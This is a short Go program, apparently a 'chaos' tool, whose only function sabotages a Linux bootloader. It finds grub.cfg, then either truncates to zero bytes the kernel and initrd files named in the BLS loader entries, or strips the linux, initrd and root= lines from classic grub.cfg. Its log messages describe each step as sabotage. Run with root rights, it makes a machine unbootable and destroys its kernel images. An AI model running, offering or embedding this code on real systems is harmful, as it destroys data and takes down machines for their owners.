package main

import (
	"log"
	"os"
	"path/filepath"
	"strings"
)

func BreakGrub() {
	// Try grub2 first, fallback to grub
	grubCfgPaths := []string{"/boot/grub2/grub.cfg", "/boot/grub/grub.cfg"}
	var grubCfg string

	for _, path := range grubCfgPaths {
		if _, err := os.Stat(path); err == nil {
			grubCfg = path
			break
		}
	}

	if grubCfg == "" {
		log.Println("[chaos] grub.cfg not found — skipping GRUB sabotage")
		return
	}

	contents, err := os.ReadFile(grubCfg)
	if err != nil {
		log.Println("[chaos] Could not read grub.cfg:", err)
		return
	}

	// BLS mode?
	if strings.Contains(string(contents), "blscfg") {
		log.Println("[chaos] Detected BLS boot mode — sabotaging loader entries")

		entries, err := filepath.Glob("/boot/loader/entries/*.conf")
		if err != nil || len(entries) == 0 {
			log.Println("[chaos] No BLS entries found to sabotage")
			return
		}

		for _, entry := range entries {
			content, err := os.ReadFile(entry)
			if err != nil {
				continue
			}
			lines := strings.Split(string(content), "\n")
			for _, line := range lines {
				if strings.HasPrefix(line, "linux") || strings.HasPrefix(line, "initrd") {
					fields := strings.Fields(line)
					if len(fields) >= 2 {
						target := filepath.Join("/boot", strings.TrimPrefix(fields[1], "/"))
						log.Println("[chaos] Truncating:", target)
						_ = os.Truncate(target, 0)
					}
				}
			}
		}

	} else {
		log.Println("[chaos] Detected Classic GRUB mode — modifying grub.cfg directly")
		lines := strings.Split(string(contents), "\n")
		var filtered []string
		for _, line := range lines {
			if !strings.Contains(line, "linux") && !strings.Contains(line, "initrd") && !strings.Contains(line, "root=") {
				filtered = append(filtered, line)
			}
		}
		err := os.WriteFile(grubCfg, []byte(strings.Join(filtered, "\n")), 0644)
		if err == nil {
			log.Println("[chaos] Successfully sabotaged classic grub.cfg")
		}
	}
}

func main() {
	BreakGrub()
}
